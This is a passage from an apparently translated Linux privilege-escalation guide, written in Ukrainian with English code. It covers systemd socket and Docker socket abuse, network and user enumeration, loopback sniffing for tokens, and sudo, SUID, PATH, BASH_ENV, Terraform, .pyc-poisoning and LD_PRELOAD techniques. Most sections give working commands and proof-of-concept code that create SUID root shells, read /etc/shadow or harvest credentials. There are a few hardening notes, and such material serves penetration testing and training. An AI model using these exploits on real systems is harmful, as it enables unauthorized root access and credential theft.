Unix Domain Sockets (UDS) забезпечують **process communication** на одній або різних машинах у межах клієнт-серверних моделей. Вони використовують стандартні Unix descriptor files для взаємодії між комп’ютерами та налаштовуються через `.socket` files.<sup>[[14]](#references)</sup>

Sockets можна налаштувати за допомогою `.socket` files.

**Дізнайтеся більше про sockets за допомогою `man systemd.socket`.** Усередині цього файла можна налаштувати кілька цікавих параметрів:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ці options відрізняються, але загалом використовуються, щоб **вказати, де socket буде прослуховувати з’єднання** (шлях до AF_UNIX socket file, IPv4/6 та/або номер порту для прослуховування тощо)
- `Accept`: приймає boolean argument. Якщо значення **true**, для **кожного вхідного з’єднання створюється service instance**, якому передається лише connection socket. Якщо значення **false**, усі listening sockets **передаються запущеному service unit**, і для всіх з’єднань створюється лише один service unit. Це значення ігнорується для datagram sockets і FIFOs, де один service unit безумовно обробляє весь вхідний traffic. **Значення за замовчуванням — false**. З міркувань продуктивності рекомендується писати нові daemons лише так, щоб вони підтримували `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: приймають один або кілька command lines, які **виконуються до** або **після** того, як listening **sockets**/FIFOs відповідно **створені** та прив’язані. Перший token command line має бути абсолютним ім’ям файла, після чого вказуються arguments для process.
- `ExecStopPre`, `ExecStopPost`: додаткові **commands**, які **виконуються до** або **після** того, як listening **sockets**/FIFOs відповідно **закриті** та видалені.
- `Service`: визначає ім’я **service** unit, який потрібно **активувати** у разі **вхідного traffic**. Це setting дозволено лише для sockets із `Accept=no`. За замовчуванням використовується service з таким самим ім’ям, як і socket (із заміною suffix). У більшості випадків використовувати цю option не потрібно.

### Writable .socket files

Якщо ви знайшли **writable** `.socket` file, можете **додати** на початку секції `[Socket]` щось на кшталт: `ExecStartPre=/home/kali/sys/backdoor`, і backdoor буде виконано перед створенням socket. Тому вам, **імовірно, доведеться зачекати, доки машину буде перезавантажено.**\
_Зверніть увагу, що system має використовувати configuration цього socket file, інакше backdoor не буде виконано_

### Socket activation + writable unit path (create missing service)

Ще одна небезпечна misconfiguration:

- socket unit із `Accept=no` і `Service=<name>.service`
- referenced service unit відсутній
- attacker може записувати до `/etc/systemd/system` (або іншого unit search path)

У такому разі attacker може створити `<name>.service`, а потім trigger-нути traffic до socket, щоб systemd завантажив і виконав новий service від імені root.

Швидкий flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Сокети, доступні для запису

Якщо ви **виявили будь-який сокет, доступний для запису** (_тепер ми говоримо про Unix Sockets, а не про файли конфігурації `.socket`_), тоді **ви можете взаємодіяти** з цим сокетом і, можливо, скористатися вразливістю.

### Перелік Unix Sockets
```bash
netstat -a -p --unix
```
### Необроблене з'єднання
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Приклад експлуатації:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP-сокети

Зверніть увагу, що можуть існувати деякі **сокети, які прослуховують HTTP**-запити (_я не маю на увазі файли .socket, а файли, що виконують роль unix-сокетів_). Перевірити це можна за допомогою:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Якщо сокет **відповідає на HTTP**-запит, тоді ви можете **взаємодіяти** з ним і, можливо, **експлуатувати певну вразливість**.

### Доступний для запису Docker Socket

Docker socket, який часто розташований за адресою `/var/run/docker.sock`, є критично важливим файлом, який слід захищати. За замовчуванням він доступний для запису користувачу `root` і членам групи `docker`. Наявність доступу на запис до цього сокета може призвести до підвищення привілеїв. Нижче наведено опис цього процесу, а також альтернативні методи на випадок, якщо Docker CLI недоступний.

#### **Підвищення привілеїв за допомогою Docker CLI**

Якщо у вас є доступ на запис до Docker socket, ви можете підвищити привілеї за допомогою таких команд:<sup>[[15]](#references)</sup>
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ці команди дають змогу запустити container із root-level доступом до файлової системи host.

#### **Використання Docker API безпосередньо**

Якщо Docker CLI недоступний, Docker socket все одно можна використати через raw HTTP поверх Unix socket. Найнадійніший процес:

- створити довгоживучий helper container із host root, підключеним через bind mount
- запустити його
- створити екземпляр `exec` усередині цього helper
- запустити екземпляр `exec` і прочитати вивід назад через API

**Перелік Docker images**
```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```
**Створіть і запустіть допоміжний контейнер**
```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
"http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
-X POST "http://localhost/v1.47/containers/${HELPER}/start"
```
**Створіть exec-екземпляр**
```bash
EXEC_ID=$(
curl -s --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
"http://localhost/v1.47/containers/${HELPER}/exec" \
| tr -d '\n' \
| sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```
**Запустіть exec instance і прочитайте вивід**
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Detach":false,"Tty":true}' \
"http://localhost/v1.47/exec/${EXEC_ID}/start"
```
Цей шаблон зазвичай надійніший, ніж спроби вручну керувати `attach` за допомогою `socat` або `nc -U`. Після створення helper із `/:/host` можна використовувати додаткові екземпляри `exec`, щоб читати файли на кшталт `/host/root/...`, додавати SSH-ключі до `/host/root/.ssh` або змінювати файли запуску host.

### Інші

Зверніть увагу: якщо у вас є права на запис до docker socket, оскільки ви **перебуваєте в групі `docker`**, у вас є [**більше способів підвищити привілеї**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Якщо [**docker API прослуховує порт**](../../../network-services-pentesting/2375-pentesting-docker.md#compromising), його також можна скомпрометувати.

Перегляньте **більше способів вийти з контейнерів або зловживати container runtimes для підвищення привілеїв** у:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Підвищення привілеїв у Containerd (ctr)

Якщо ви виявили, що можете використовувати команду **`ctr`**, прочитайте наведену нижче сторінку, оскільки **можливо, ви зможете зловживати нею для підвищення привілеїв**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Підвищення привілеїв у **RunC**

Якщо ви виявили, що можете використовувати команду **`runc`**, прочитайте наведену нижче сторінку, оскільки **можливо, ви зможете зловживати нею для підвищення привілеїв**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це складна **система міжпроцесної взаємодії (IPC)**, яка дає змогу застосункам ефективно взаємодіяти та обмінюватися даними. Розроблена з урахуванням сучасних Linux-систем, вона забезпечує надійну інфраструктуру для різних форм взаємодії між застосунками.<sup>[[16]](#references)</sup>

Система є універсальною та підтримує базову IPC, яка покращує обмін даними між процесами, нагадуючи **розширені UNIX domain sockets**. Крім того, вона допомагає транслювати події або сигнали, забезпечуючи безперешкодну інтеграцію між компонентами системи. Наприклад, сигнал від Bluetooth daemon про вхідний виклик може змусити music player вимкнути звук, покращуючи взаємодію з користувачем. Додатково D-Bus підтримує систему віддалених об’єктів, спрощуючи запити до служб і виклики методів між застосунками та оптимізуючи процеси, які раніше були складними.

D-Bus працює за **моделлю дозволу/заборони**, керуючи дозволами на повідомлення (виклики методів, надсилання сигналів тощо) на основі сукупного ефекту відповідних правил політик. Ці політики визначають взаємодію з bus і потенційно можуть дозволити підвищення привілеїв через експлуатацію цих дозволів.

Приклад такої політики у `/etc/dbus-1/system.d/wpa_supplicant.conf` наведено нижче; вона визначає дозволи для root user володіти повідомленнями від `fi.w1.wpa_supplicant1`, надсилати їх і отримувати їх.

Політики без указаного user або group застосовуються універсально, тоді як політики контексту "default" застосовуються до всіх випадків, не охоплених іншими конкретними політиками.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся, як виконувати перерахування та експлуатувати комунікацію D-Bus:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Мережа**

Завжди цікаво виконати перерахування мережі та визначити розташування машини.

### Загальне перерахування
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Швидке первинне діагностування вихідної фільтрації

Якщо хост може виконувати команди, але callbacks не працюють, швидко розділіть фільтрацію DNS, transport, proxy та route:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Відкриті порти

Завжди перевіряйте мережеві служби, запущені на машині, з якими вам не вдалося взаємодіяти до отримання доступу до неї:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Класифікуйте listeners за ціллю прив’язки:

- `0.0.0.0` / `[::]`: доступні через усі локальні інтерфейси.
- `127.0.0.1` / `::1`: доступні лише локально (хороші кандидати для tunnel/forward).
- Конкретні внутрішні IP-адреси (наприклад, `10.x`, `172.16/12`, `192.168.x`, `fe80::`): зазвичай доступні лише з внутрішніх сегментів.

### Робочий процес triage локальних сервісів

Після компрометації host сервіси, прив’язані до `127.0.0.1`, часто вперше стають доступними з вашої shell. Швидкий локальний workflow:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS як мережевий сканер (режим лише мережі)

Окрім локальних перевірок PE, linPEAS може працювати як спеціалізований мережевий сканер. Він використовує доступні бінарні файли з `$PATH` (зазвичай `fping`, `ping`, `nc`, `ncat`) і не встановлює жодних інструментів.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Якщо передати `-d`, `-p` або `-i` без `-t`, linPEAS працює як чистий network scanner, пропускаючи решту перевірок privilege-escalation.

### Sniffing

Перевірте, чи можете ви перехоплювати трафік. Якщо так, ви можете отримати деякі облікові дані.
```
timeout 1 tcpdump
```
Швидкі практичні перевірки:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) особливо цінний під час post-exploitation, оскільки багато внутрішніх служб відкривають там tokens/cookies/credentials:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Збирайте зараз, аналізуйте пізніше:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Користувачі

### Generic Enumeration

Перевірте, **хто** ви, які **привілеї** ви маєте, які **користувачі** є в системі, хто може виконувати **login**, а хто має **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Великий UID

Деякі версії Linux були вразливими до помилки, яка дозволяє користувачам із **UID > INT_MAX** підвищувати привілеї. Більше інформації: [тут](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [тут](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) і [тут](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Експлуатуйте це** за допомогою: **`systemd-run -t /bin/bash`**

### Групи

Перевірте, чи є ви **учасником певної групи**, яка може надати вам root-привілеї:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Буфер обміну

Перевірте, чи є в буфері обміну щось цікаве (якщо це можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Відомі паролі

Якщо ви **знаєте будь-який пароль** середовища, **спробуйте увійти від імені кожного користувача**, використовуючи цей пароль.

### Su Brute

Якщо ви не проти створити багато шуму, а `su` і `timeout` binaries присутні на комп'ютері, можна спробувати brute-force користувача за допомогою [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також намагається brute-force користувачів.

## Зловживання записуваним $PATH

### $PATH

Якщо ви виявили, що можете **записувати в певну папку з $PATH**, можливо, ви зможете підвищити привілеї, **створивши backdoor у записуваній папці** з назвою команди, яка буде виконана іншим користувачем (в ідеалі root) і яка **не завантажується з папки, розташованої перед** вашою записуваною папкою в $PATH.

### SUDO та SUID

Вам може бути дозволено виконувати певні команди за допомогою sudo, або вони можуть мати біт suid. Перевірте це за допомогою:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **неочікувані команди дають змогу читати та/або записувати файли або навіть виконувати команду**.<sup>[[8]](#references)</sup> Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Конфігурація Sudo може дозволяти користувачу виконувати певну команду з привілеями іншого користувача, не знаючи пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` від імені `root`; тепер отримати shell дуже просто, додавши SSH-ключ до каталогу root або викликавши `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачеві **встановити змінну середовища** під час виконання чогось:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **на основі машини HTB Admirer**, був **вразливим** до **PYTHONPATH hijacking**, що дозволяло завантажити довільну python library під час виконання скрипта від імені root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Отруєння доступного для запису `__pycache__` / `.pyc` в імпортах Python, дозволених sudo

Якщо **Python-скрипт, дозволений sudo**, імпортує модуль, у каталозі пакета якого міститься **доступний для запису `__pycache__`**, ви можете замінити кешований `.pyc` і отримати виконання коду від імені привілейованого користувача під час наступного імпорту.<sup>[[30]](#references)</sup>

- Чому це працює:
- CPython зберігає кеш байткоду в `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
- Інтерпретатор перевіряє **заголовок** (magic + метадані timestamp/hash, пов’язані з source), а потім виконує marshaled code object, що зберігається після цього заголовка.
- Якщо ви можете **видалити та повторно створити** кешований файл, оскільки каталог доступний для запису, `.pyc`, власником якого є root і який недоступний для запису, все одно можна замінити.
- Типовий шлях:
- `sudo -l` показує Python-скрипт або wrapper, який можна запустити від імені root.
- Цей скрипт імпортує локальний модуль з `/opt/app/`, `/usr/local/lib/...` тощо.
- Каталог `__pycache__` імпортованого модуля доступний для запису вашому користувачу або всім користувачам.

Швидкий пошук:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Якщо ви можете проаналізувати привілейований скрипт, визначте імпортовані модулі та шлях до їхнього кешу:<sup>[[32]](#references)</sup>
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Процес експлуатації:

1. Один раз запустіть скрипт, дозволений через sudo, щоб Python створив легітимний файл кешу, якщо його ще немає.
2. Прочитайте перші 16 байтів із легітимного `.pyc` і повторно використайте їх у poisoned-файлі.
3. Скомпілюйте об'єкт коду payload, виконайте для нього `marshal.dumps(...)`, видаліть оригінальний файл кешу та створіть його заново з оригінальним заголовком і вашим шкідливим bytecode.
4. Повторно запустіть скрипт, дозволений через sudo, щоб імпорт виконав ваш payload від імені root.

Важливі примітки:

- Повторне використання оригінального заголовка є ключовим, оскільки Python перевіряє метадані кешу щодо source-файлу, а не те, чи справді тіло bytecode відповідає source-файлу.
- Це особливо корисно, коли source-файл належить root і недоступний для запису, але каталог `__pycache__`, що його містить, доступний для запису.
- Атака не спрацює, якщо привілейований процес використовує `PYTHONDONTWRITEBYTECODE=1`, імпортує з розташування з безпечними дозволами або прибирає доступ на запис до кожного каталогу в import path.

Мінімальна форма proof-of-concept:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Посилення захисту:

- Переконайтеся, що жоден каталог у привілейованому Python import path не доступний для запису користувачам із низькими привілеями, зокрема `__pycache__`.
- Для привілейованих запусків розгляньте використання `PYTHONDONTWRITEBYTECODE=1` і періодичні перевірки на наявність неочікуваних каталогів `__pycache__`, доступних для запису.
- Ставтеся до локальних Python-модулів і каталогів кешу, доступних для запису, так само, як до shell-скриптів або shared libraries, доступних для запису та виконуваних від імені root.

### BASH_ENV збережено через sudo env_keep → shell root

Якщо sudoers зберігає `BASH_ENV` (наприклад, `Defaults env_keep+="ENV BASH_ENV"`), можна скористатися поведінкою Bash під час запуску non-interactive shell, щоб виконати довільний код від імені root під час виклику дозволеної команди.<sup>[[24]](#references)</sup>

- Чому це працює: для non-interactive shell Bash обробляє `$BASH_ENV` і підключає цей файл перед виконанням цільового скрипта. Багато правил sudo дозволяють запускати скрипт або shell wrapper. Якщо `BASH_ENV` збережено через sudo, ваш файл буде підключено з привілеями root.<sup>[[23]](#references)</sup>

- Вимоги:
- Правило sudo, яке можна виконати (будь-яка ціль, що викликає `/bin/bash` у non-interactive режимі, або будь-який bash-скрипт).
- `BASH_ENV` присутній у `env_keep` (перевірте за допомогою `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Посилення захисту:
- Видаліть `BASH_ENV` (і `ENV`) з `env_keep`, надавайте перевагу `env_reset`.
- Уникайте shell-обгорток для команд, дозволених через sudo; використовуйте мінімальні binaries.
- Розгляньте I/O logging у sudo та сповіщення, коли використовуються збережені змінні середовища.

### Terraform через sudo зі збереженим HOME (!env_reset)

Якщо sudo залишає середовище без змін (`!env_reset`), дозволяючи виконання `terraform apply`, `$HOME` залишається таким, що належить користувачу, який викликає команду. Тому Terraform завантажує **$HOME/.terraformrc** як root і враховує `provider_installation.dev_overrides`.<sup>[[25]](#references)</sup>

- Вкажіть необхідному provider доступний для запису каталог і розмістіть у ньому шкідливий plugin з назвою provider (наприклад, `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform не пройде Go plugin handshake, але виконає payload від імені root перед завершенням роботи, залишивши після себе SUID shell.

### Перевизначення TF_VAR + обхід перевірки symlink

Змінні Terraform можна передавати через змінні середовища `TF_VAR_<name>`, які зберігаються, коли sudo зберігає середовище. Слабкі перевірки, такі як `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, можна обійти за допомогою symlink:<sup>[[25]](#references)</sup>
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform розв’язує symlink і копіює справжній `/root/root.txt` у destination, доступний для читання attacker. Такий самий підхід можна використовувати, щоб **записувати** у privileged paths, заздалегідь створюючи symlinks у destination (наприклад, вказуючи destination path provider’а всередині `/etc/cron.d/`).

### requiretty / !requiretty

У деяких старіших дистрибутивах sudo можна налаштувати з `requiretty`, що змушує sudo запускатися лише з інтерактивного TTY. Якщо встановлено `!requiretty` (або опція відсутня), sudo можна виконувати з non-interactive contexts, таких як reverse shells, cron jobs або scripts.
```bash
Defaults !requiretty
```
Це не є прямою вразливістю саме по собі, але розширює ситуації, у яких правила sudo можна зловживати без повноцінного PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Якщо `sudo -l` показує `env_keep+=PATH` або `secure_path`, що містить доступні для запису зловмисником entries (наприклад, `/home/<user>/bin`), будь-яку відносну команду всередині дозволеного sudo target можна підмінити.<sup>[[3]](#references)</sup>

- Вимоги: правило sudo (часто `NOPASSWD`), яке запускає script/binary, що викликає команди без абсолютних шляхів (`free`, `df`, `ps` тощо), і доступний для запису entry у PATH, який перевіряється першим.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Обхід шляхів під час виконання через Sudo
**Переходьте** до читання інших файлів або використовуйте **symlinks**. Наприклад, у файлі sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **wildcard** (\*), це ще простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Контрзаходи**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Команда Sudo/SUID-бінарний файл без шляху до команди

Якщо **дозвіл sudo** надано для однієї команди **без зазначення шляху**: _hacker10 ALL= (root) less_, це можна використати, змінивши змінну PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Цю техніку також можна використовувати, якщо **suid** binary **виконує іншу команду без зазначення шляху до неї (завжди перевіряйте за допомогою** _**strings**_ **вміст підозрілого SUID binary)**.

[Приклади payload для виконання.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### SUID binary зі шляхом до команди

Якщо **suid** binary **виконує іншу команду, вказуючи шлях**, тоді можна спробувати **експортувати функцію** з назвою команди, яку викликає suid-файл.

Наприклад, якщо suid binary викликає _**/usr/sbin/service apache2 start**_, потрібно спробувати створити функцію та експортувати її:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Потім, коли ви викличете бінарний файл suid, цю функцію буде виконано

### Скрипт із правом запису, який виконується SUID-обгорткою

Поширена помилка конфігурації custom-app — це SUID-бінарний файл-обгортка, власником якого є root, що виконує скрипт, тоді як сам скрипт доступний для запису користувачам із низькими привілеями.

Типовий шаблон:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Якщо `/usr/local/bin/backup.sh` доступний для запису, ви можете додати команди payload, а потім виконати SUID-обгортку:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Швидкі перевірки:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Цей шлях атаки особливо поширений у "maintenance"/"backup" wrappers, що постачаються в `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Змінна середовища **LD_PRELOAD** використовується для визначення однієї або кількох shared libraries (файлів .so), які loader має завантажити перед усіма іншими, зокрема стандартною C library (`libc.so`). Цей процес називається preloading library.

Однак для підтримання безпеки системи та запобігання експлуатації цієї функції, особливо за допомогою **suid/sgid** executables, система застосовує певні умови:

- loader ігнорує **LD_PRELOAD** для executables, у яких реальний user ID (_ruid_) не збігається з effective user ID (_euid_).
- Для executables із suid/sgid preloaded будуть лише libraries зі standard paths, які також мають suid/sgid.

Privilege escalation може статися, якщо ви маєте можливість виконувати commands за допомогою `sudo`, а вивід `sudo -l` містить statement **env_keep+=LD_PRELOAD**. Ця configuration дозволяє змінній середовища **LD_PRELOAD** зберігатися та розпізнаватися навіть під час виконання commands через `sudo`, що потенційно може призвести до виконання arbitrary code з elevated privileges.<sup>[[9]](#references)</sup>
```
Defaults        env_keep += LD_PRELOAD
```
Збережіть як **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Потім **скомпілюйте його** за допомогою:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, **підвищте привілеї**, виконавши
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
